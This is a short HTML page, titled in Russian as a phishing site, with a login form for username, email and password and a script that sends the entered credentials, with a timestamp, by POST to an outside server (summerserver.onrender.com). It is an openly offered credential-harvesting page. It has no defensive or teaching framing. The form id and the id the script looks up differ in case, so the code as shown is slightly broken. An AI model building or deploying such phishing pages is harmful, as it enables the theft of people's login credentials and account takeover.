<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Фишинговый сайт</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <form action="" id="loginform">
        <input type="text" placeholder="Введите логин" id="username">
        <input type="email" placeholder="Введите почту" id="email">
        <input type="password" name="" id="password" placeholder="Введите пороль">
        <input type="checkbox" name="" id="">
        <p>Запомнить меня</p>
        <input type="submit" value="Отправить ">
    </form>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                email: document.getElementById('email').value,
                date: new Date().toLocaleString()
            };
            console.log(data);


            // Отправляем данные на сервер
            const response = await fetch('http://summerserver.onrender.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            const result = await response.text();
            document.body.innerHTML = result;
        });
    </script>
</body>
</html>
